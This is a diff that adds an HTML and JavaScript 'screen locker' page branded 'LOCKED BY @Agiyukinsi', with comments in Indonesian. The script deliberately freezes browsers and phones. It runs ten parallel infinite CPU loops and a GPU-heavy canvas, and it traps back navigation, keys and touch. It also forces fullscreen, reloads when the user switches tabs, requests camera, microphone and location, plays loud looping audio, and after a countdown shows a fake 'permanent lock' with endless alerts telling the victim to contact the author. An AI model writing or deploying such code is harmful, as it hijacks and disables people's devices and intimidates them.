@@ -1,0 +1,670 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>🔒 LOCKED BY @Agiyukinsi 🔒</title>
+    <!-- FontAwesome 6 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* PENGUASAAN TOTAL SISTEM */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-touch-callout: none;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
+            background: #000;
+            font-family: 'Courier New', monospace;
+        }
+
+        /* LAYER LOCK EKSTRIM */
+        .lock-layer {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 30% 30%, #2a0000, #000000);
+            z-index: 999999999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            border: 15px solid #8b0000;
+            box-shadow: inset 0 0 300px rgba(139,0,0,0.9), 0 0 200px rgba(255,0,0,0.8);
+            animation: extremePulse 0.5s infinite;
+        }
+
+        @keyframes extremePulse {
+            0% { border-color: #8b0000; box-shadow: inset 0 0 300px #8b0000, 0 0 200px red; }
+            25% { border-color: #ff4500; box-shadow: inset 0 0 300px #ff4500, 0 0 200px #ff4500; }
+            50% { border-color: #ff0000; box-shadow: inset 0 0 300px #ff0000, 0 0 200px #ff0000; }
+            75% { border-color: #8b0000; box-shadow: inset 0 0 300px #8b0000, 0 0 200px #8b0000; }
+            100% { border-color: #8b0000; box-shadow: inset 0 0 300px #8b0000, 0 0 200px red; }
+        }
+
+        /* GLITCH SUPER INTENSE */
+        @keyframes superGlitch {
+            0% { transform: translate(0) scale(1); filter: hue-rotate(0deg) brightness(1); }
+            10% { transform: translate(-15px, 15px) scale(1.02); filter: hue-rotate(90deg) brightness(1.5); }
+            20% { transform: translate(15px, -15px) scale(0.98); filter: hue-rotate(180deg) brightness(2); }
+            30% { transform: translate(-15px, -15px) scale(1.03); filter: hue-rotate(270deg) brightness(1.8); }
+            40% { transform: translate(15px, 15px) scale(0.97); filter: hue-rotate(360deg) brightness(1.3); }
+            50% { transform: translate(-25px, 25px) scale(1.05); filter: hue-rotate(90deg) invert(1) brightness(2); }
+            60% { transform: translate(25px, -25px) scale(0.95); filter: hue-rotate(180deg) invert(1) brightness(2); }
+            70% { transform: translate(-25px, -25px) scale(1.04); filter: hue-rotate(270deg) invert(1) brightness(2); }
+            80% { transform: translate(25px, 25px) scale(0.96); filter: hue-rotate(360deg) invert(1) brightness(2); }
+            90% { transform: translate(-10px, 10px) scale(1.01); filter: hue-rotate(45deg) brightness(1.2); }
+            100% { transform: translate(0) scale(1); filter: hue-rotate(0deg) brightness(1); }
+        }
+
+        .super-glitch {
+            animation: superGlitch 0.2s infinite;
+        }
+
+        /* SKULL DENGAN DARAH */
+        .blood-skull {
+            font-size: 12rem;
+            color: #8b0000;
+            text-shadow: 0 0 100px #ff0000, 0 0 200px #ff0000, 0 0 300px #8b0000;
+            animation: skullFloat 1s infinite;
+            filter: drop-shadow(0 0 50px red);
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .blood-skull::after {
+            content: '💀';
+            position: absolute;
+            top: 5px;
+            left: 5px;
+            color: #ff4500;
+            filter: blur(10px);
+            z-index: -1;
+        }
+
+        @keyframes skullFloat {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            25% { transform: translateY(-20px) rotate(-5deg); }
+            50% { transform: translateY(0) rotate(0deg); }
+            75% { transform: translateY(20px) rotate(5deg); }
+        }
+
+        /* TEKS UTAMA BARU "LOCKED BY @Agiyukinsi" */
+        .locked-text {
+            font-size: 5rem;
+            font-weight: 900;
+            color: #ff0000;
+            text-align: center;
+            text-shadow: 5px 5px 0px #00ff00, 10px 10px 0px #0000ff, 15px 15px 0px #ffff00;
+            margin-bottom: 30px;
+            line-height: 1.2;
+            animation: textShake 0.3s infinite;
+        }
+
+        @keyframes textShake {
+            0%, 100% { transform: skew(0deg, 0deg); }
+            25% { transform: skew(5deg, 5deg); }
+            50% { transform: skew(-5deg, -5deg); }
+            75% { transform: skew(5deg, -5deg); }
+        }
+
+        .sub-locked {
+            font-size: 2.5rem;
+            color: #ffffff;
+            background: rgba(139,0,0,0.7);
+            padding: 15px 30px;
+            border-radius: 50px;
+            border: 4px solid #ff4500;
+            margin-bottom: 30px;
+            box-shadow: 0 0 100px red;
+        }
+
+        /* TIMER DENGAN EFEK MENAKUTKAN */
+        .timer-evil {
+            font-size: 8rem;
+            font-weight: bold;
+            color: #ff4500;
+            text-shadow: 0 0 50px red, 0 0 100px darkred;
+            font-family: 'Courier New', monospace;
+            background: black;
+            padding: 20px 50px;
+            border-radius: 50px;
+            border: 5px solid red;
+            margin-bottom: 30px;
+            animation: timerBlink 1s infinite;
+        }
+
+        @keyframes timerBlink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; background: #330000; }
+        }
+
+        /* INPUT PIN DENGAN STYLE DARAH */
+        .pin-blood {
+            background: #1a0000;
+            border: 8px solid #8b0000;
+            border-radius: 60px;
+            padding: 40px;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 0 200px rgba(139,0,0,0.8), inset 0 0 100px rgba(255,0,0,0.5);
+        }
+
+        .pin-label-blood {
+            color: #ff4500;
+            font-size: 2rem;
+            text-align: center;
+            margin-bottom: 25px;
+            text-transform: uppercase;
+            letter-spacing: 8px;
+            font-weight: bold;
+            text-shadow: 0 0 20px red;
+        }
+
+        .pin-input-blood {
+            width: 100%;
+            background: #2a0000;
+            border: 5px solid #ff0000;
+            color: #ff4500;
+            font-size: 4rem;
+            text-align: center;
+            padding: 25px;
+            border-radius: 40px;
+            letter-spacing: 20px;
+            font-weight: bold;
+            caret-color: transparent;
+            outline: none;
+            margin-bottom: 25px;
+        }
+
+        .pin-input-blood:focus {
+            background: #3a0000;
+            box-shadow: 0 0 100px red;
+            border-color: #ff4500;
+        }
+
+        .btn-blood {
+            width: 100%;
+            background: linear-gradient(135deg, #8b0000, #ff0000, #8b0000);
+            background-size: 200% 200%;
+            color: white;
+            font-size: 3rem;
+            font-weight: bold;
+            padding: 25px;
+            border: none;
+            border-radius: 40px;
+            text-transform: uppercase;
+            letter-spacing: 8px;
+            cursor: pointer;
+            box-shadow: 0 0 100px red;
+            animation: gradientMove 2s infinite;
+            border: 4px solid #ffff00;
+        }
+
+        @keyframes gradientMove {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .btn-blood:active {
+            transform: scale(0.95);
+        }
+
+        /* CANVAS UNTUK LAG */
+        #lagCanvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 999999998;
+            opacity: 0.3;
+            pointer-events: none;
+        }
+
+        /* AUDIO TERSEMBUNYI */
+        audio {
+            display: none;
+        }
+
+        /* INFORMASI TAMBAHAN */
+        .info-text {
+            color: #cc6666;
+            margin-top: 30px;
+            font-size: 1.5rem;
+            text-align: center;
+            border-top: 2px solid red;
+            padding-top: 20px;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- CANVAS LAG -->
+    <canvas id="lagCanvas"></canvas>
+
+    <!-- LOCK SCREEN UTAMA -->
+    <div class="lock-layer super-glitch" id="lockLayer">
+        <div class="blood-skull">
+            💀
+        </div>
+
+        <!-- TEKS BARU "LOCKED BY @Agiyukinsi" -->
+        <div class="locked-text">
+            LOCKED BY<br>@Agiyukinsi
+        </div>
+
+        <div class="sub-locked">
+            <i class="fas fa-skull-crossbones"></i> PERMANENT LOCK <i class="fas fa-skull-crossbones"></i>
+        </div>
+
+        <!-- TIMER MENAKUTKAN -->
+        <div class="timer-evil" id="evilTimer">60</div>
+
+        <!-- FORM PIN -->
+        <div class="pin-blood">
+            <div class="pin-label-blood">
+                <i class="fas fa-lock"></i> ENTER PIN <i class="fas fa-lock"></i>
+            </div>
+            <input type="password" id="pinInput" class="pin-input-blood" maxlength="4" inputmode="numeric" pattern="\d*" autofocus>
+            <button class="btn-blood" id="submitBtn">
+                <i class="fas fa-key"></i> UNLOCK
+            </button>
+            <div style="color: #aa2222; text-align: center; margin-top: 25px; font-size: 1.8rem; text-shadow: 0 0 10px red;">
+                PIN: 1239
+            </div>
+        </div>
+
+        <div class="info-text">
+            <i class="fas fa-exclamation-triangle"></i> TIDAK ADA IZIN - APLIKASI DISEMATKAN <i class="fas fa-exclamation-triangle"></i>
+        </div>
+    </div>
+
+    <!-- AUDIO MALWARE (FULL VOLUME) -->
+    <audio id="malwareAudio" loop>
+        <source src="data:audio/wav;base64,UklGRlwAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YVAAAAA8AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wA=" type="audio/wav">
+    </audio>
+
+    <script>
+        (function() {
+            // ==================== KONFIGURASI ====================
+            const CORRECT_PIN = "1239";
+            const LOCKED_BY = "@Agiyukinsi";
+            let timeLeft = 60; // 60 detik lebih menegangkan
+            let timerInterval;
+            let isUnlocked = false;
+            let audioContext;
+            let lagIntensity = 1.0;
+
+            // Ambil elemen
+            const lockLayer = document.getElementById('lockLayer');
+            const pinInput = document.getElementById('pinInput');
+            const submitBtn = document.getElementById('submitBtn');
+            const evilTimer = document.getElementById('evilTimer');
+            const audio = document.getElementById('malwareAudio');
+            const canvas = document.getElementById('lagCanvas');
+            const ctx = canvas.getContext('2d');
+
+            // ==================== LAG CANVAS BERAT ====================
+            function renderLagCanvas() {
+                if (isUnlocked) return;
+                
+                // Set resolusi tinggi untuk beban GPU
+                const width = window.innerWidth * 3;
+                const height = window.innerHeight * 3;
+                
+                if (canvas.width !== width || canvas.height !== height) {
+                    canvas.width = width;
+                    canvas.height = height;
+                }
+
+                // Gambar pattern kompleks
+                for (let i = 0; i < 100; i++) {
+                    const x = Math.random() * width;
+                    const y = Math.random() * height;
+                    const radius = Math.random() * 200 + 100;
+                    
+                    // Gradient rumit
+                    const gradient = ctx.createRadialGradient(x, y, 0, x, y, radius);
+                    gradient.addColorStop(0, `rgba(255,0,0,${Math.random()})`);
+                    gradient.addColorStop(0.3, `rgba(139,0,0,${Math.random()})`);
+                    gradient.addColorStop(0.6, `rgba(255,69,0,${Math.random()})`);
+                    gradient.addColorStop(1, `rgba(0,0,0,${Math.random()})`);
+                    
+                    ctx.beginPath();
+                    ctx.arc(x, y, radius, 0, Math.PI * 2);
+                    ctx.fillStyle = gradient;
+                    ctx.fill();
+                    
+                    // Shadow berat
+                    ctx.shadowColor = 'red';
+                    ctx.shadowBlur = 100;
+                    ctx.shadowOffsetX = 50;
+                    ctx.shadowOffsetY = 50;
+                }
+
+                // Gambar teks berulang
+                ctx.font = 'bold 300px Arial';
+                ctx.fillStyle = 'rgba(255,0,0,0.1)';
+                for (let i = 0; i < 50; i++) {
+                    ctx.fillText('💀 LOCKED 💀', Math.random() * width, Math.random() * height);
+                }
+
+                requestAnimationFrame(renderLagCanvas);
+            }
+
+            // ==================== INFINITE LOOP CPU ====================
+            function startInfiniteLoop() {
+                function heavyComputation() {
+                    while (true) {
+                        // Loop tak terbatas dengan operasi berat
+                        for (let i = 0; i < 1000000; i++) {
+                            Math.sqrt(Math.random() * 999999);
+                            Math.sin(Math.random() * 360);
+                            Math.cos(Math.random() * 360);
+                            Math.tan(Math.random() * 360);
+                        }
+                        // Break sebentar biar gak total crash, tapi tetap berat
+                        setTimeout(heavyComputation, 1);
+                    }
+                }
+                
+                // Jalankan 10 loop paralel
+                for (let i = 0; i < 10; i++) {
+                    setTimeout(heavyComputation, i * 10);
+                }
+            }
+
+            // ==================== BLOKIR TOTAL IZIN DAN NAVIGASI ====================
+            
+            function blockAllPermissions() {
+                // Minta izin yang tidak bisa diberikan (membuat sistem sibuk)
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                        .then(() => {})
+                        .catch(() => {});
+                }
+
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(() => {}, () => {}, { enableHighAccuracy: true });
+                }
+
+                if (window.Notification && Notification.permission !== 'denied') {
+                    Notification.requestPermission();
+                }
+
+                if (navigator.vibrate) {
+                    setInterval(() => {
+                        navigator.vibrate([500, 200, 500, 200, 1000]);
+                    }, 3000);
+                }
+
+                // Cegah akses ke file (simulasi)
+                window.addEventListener('dragover', e => e.preventDefault());
+                window.addEventListener('drop', e => e.preventDefault());
+            }
+
+            function blockNavigation() {
+                // History trap
+                window.history.pushState(null, null, window.location.href);
+                window.addEventListener('popstate', function() {
+                    if (!isUnlocked) {
+                        window.history.pushState(null, null, window.location.href);
+                        alert('🔒 TIDAK BISA KELUAR! LOCKED BY ' + LOCKED_BY);
+                    }
+                });
+
+                // Blokir semua tombol
+                window.addEventListener('keydown', function(e) {
+                    if (!isUnlocked) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        
+                        if (e.key === 'Escape' || e.key === 'Back' || e.key === 'Home' || e.key === 'GoBack') {
+                            alert('⛔ TOMBOL DINONAKTIFKAN OLEH ' + LOCKED_BY);
+                        }
+                        return false;
+                    }
+                }, true);
+
+                // Blokir touch gestures
+                window.addEventListener('touchstart', e => e.preventDefault(), { passive: false });
+                window.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
+                window.addEventListener('touchend', e => e.preventDefault(), { passive: false });
+
+                // Fullscreen paksa
+                function forceFullScreen() {
+                    if (!isUnlocked) {
+                        const elem = document.documentElement;
+                        if (elem.requestFullscreen) elem.requestFullscreen();
+                        else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+                        else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
+                    }
+                }
+                
+                setInterval(forceFullScreen, 1000);
+
+                // Cegah exit fullscreen
+                document.addEventListener('fullscreenchange', () => {
+                    if (!isUnlocked && !document.fullscreenElement) {
+                        forceFullScreen();
+                    }
+                });
+            }
+
+            // ==================== TIMER DAN LOCK PERMANENT ====================
+            
+            function updateTimer() {
+                if (isUnlocked) return;
+                
+                evilTimer.textContent = timeLeft;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    permanentLock();
+                } else {
+                    timeLeft--;
+                    
+                    // Efek visual kalau waktu tinggal sedikit
+                    if (timeLeft < 20) {
+                        evilTimer.style.color = '#ffff00';
+                        evilTimer.style.textShadow = '0 0 100px yellow';
+                    }
+                    if (timeLeft < 10) {
+                        evilTimer.style.color = '#ffffff';
+                        evilTimer.style.animation = 'timerBlink 0.2s infinite';
+                    }
+                }
+            }
+
+            function permanentLock() {
+                // Hancurkan semua, tidak bisa kembali
+                document.body.innerHTML = `
+                    <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:black; display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:9999999999; border:20px solid #8b0000; animation: superGlitch 0.1s infinite;">
+                        <div style="font-size:200px; color:#8b0000; filter:drop-shadow(0 0 100px red);">💀</div>
+                        <h1 style="color:red; font-size:80px; text-align:center; text-shadow:5px 5px 0px yellow;">PERMANENT LOCK</h1>
+                        <h2 style="color:white; font-size:60px; margin-top:50px; text-align:center;">LOCKED BY @Agiyukinsi</h2>
+                        <h3 style="color:#ff4500; font-size:50px; margin-top:30px;">PIN 1239 TIDAK DIGUNAKAN</h3>
+                        <p style="color:#666; margin-top:50px; font-size:30px;">HUBUNGI @Agiyukinsi UNTUK UNLOCK</p>
+                        <style>
+                            @keyframes superGlitch{0%{filter:hue-rotate(0deg) invert(0);}50%{filter:hue-rotate(180deg) invert(1);}100%{filter:hue-rotate(360deg) invert(0);}}
+                        </style>
+                    </div>
+                `;
+                
+                // Putar audio maksimal
+                audio.volume = 1.0;
+                audio.loop = true;
+                audio.play().catch(e => {});
+                
+                // Tampilkan alert terus
+                setInterval(() => {
+                    alert('⚠️ LOCKED BY @Agiyukinsi! HUBUNGI UNTUK PIN! ⚠️');
+                }, 2000);
+            }
+
+            // ==================== CEK PIN ====================
+            
+            function checkPin() {
+                const enteredPin = pinInput.value;
+                
+                if (enteredPin === CORRECT_PIN) {
+                    // PIN BENAR
+                    isUnlocked = true;
+                    
+                    // Hentikan audio
+                    audio.pause();
+                    audio.currentTime = 0;
+                    
+                    // Hentikan timer
+                    clearInterval(timerInterval);
+                    
+                    alert('✅ PIN BENAR! SISTEM DIBUKA OLEH ' + LOCKED_BY + ' ✅');
+                    
+                    // Redirect ke halaman kosong (bebas)
+                    window.location.href = 'about:blank';
+                    
+                } else {
+                    // PIN SALAH
+                    alert('❌ PIN SALAH! PERCOBAAN GAGAL! LOCKED BY ' + LOCKED_BY);
+                    
+                    // Reset input
+                    pinInput.value = '';
+                    
+                    // Tambah efek glitch
+                    lockLayer.style.animation = 'none';
+                    setTimeout(() => {
+                        lockLayer.style.animation = 'superGlitch 0.2s infinite';
+                    }, 10);
+                    
+                    // Kurangi waktu 5 detik
+                    timeLeft = Math.max(0, timeLeft - 5);
+                    evilTimer.textContent = timeLeft;
+                    
+                    if (timeLeft <= 0) {
+                        permanentLock();
+                    }
+                    
+                    // Putar audio keras
+                    audio.volume = 1.0;
+                    audio.play().catch(e => {});
+                    
+                    // Getar kalau support
+                    if (navigator.vibrate) {
+                        navigator.vibrate(1000);
+                    }
+                }
+            }
+
+            // ==================== APLIKASI DISEMATKAN (STICKY) ====================
+            
+            function makeAppSticky() {
+                // Cegah close/exit
+                window.addEventListener('beforeunload', function(e) {
+                    if (!isUnlocked) {
+                        e.preventDefault();
+                        e.returnValue = '⚠️ APLIKASI TERKUNCI OLEH @Agiyukinsi! ⚠️';
+                        return '⚠️ APLIKASI TERKUNCI OLEH @Agiyukinsi! ⚠️';
+                    }
+                });
+
+                // Cegah tab switch (deteksi visibility)
+                document.addEventListener('visibilitychange', function() {
+                    if (!isUnlocked && document.hidden) {
+                        // Kalau pindah tab, balikin lagi
+                        setTimeout(() => {
+                            if (!isUnlocked) {
+                                window.location.reload();
+                            }
+                        }, 100);
+                    }
+                });
+
+                // Cegah screenshot (hanya visual)
+                document.addEventListener('keyup', (e) => {
+                    if (e.key === 'PrintScreen') {
+                        alert('📸 SCREENSHOT DICEK OLEH ' + LOCKED_BY);
+                    }
+                });
+            }
+
+            // ==================== INISIALISASI ====================
+            
+            // Jalankan semua fungsi
+            renderLagCanvas();
+            startInfiniteLoop();
+            blockAllPermissions();
+            blockNavigation();
+            makeAppSticky();
+            
+            // Timer
+            timerInterval = setInterval(updateTimer, 1000);
+            
+            // Event listeners
+            submitBtn.addEventListener('click', checkPin);
+            
+            pinInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    checkPin();
+                }
+            });
+            
+            pinInput.addEventListener('input', function(e) {
+                this.value = this.value.replace(/[^0-9]/g, '').slice(0,4);
+            });
+            
+            // Fokus terus ke input
+            setInterval(() => {
+                if (!isUnlocked) {
+                    pinInput.focus();
+                }
+            }, 50);
+            
+            // Putar audio setelah load
+            setTimeout(() => {
+                if (!isUnlocked) {
+                    audio.volume = 0.8;
+                    audio.play().catch(e => {
+                        // Kalau gagal, coba lagi nanti
+                        setTimeout(() => audio.play().catch(() => {}), 1000);
+                    });
+                }
+            }, 500);
+
+            // Lock orientasi
+            if (screen.orientation && screen.orientation.lock) {
+                screen.orientation.lock('portrait').catch(e => {});
+            }
+
+            // Override tombol power (simulasi)
+            let lastActive = Date.now();
+            setInterval(() => {
+                if (!isUnlocked && document.hidden) {
+                    window.location.reload();
+                }
+            }, 500);
+
+        })();
+    </script>
+</body>
+</html>
+```
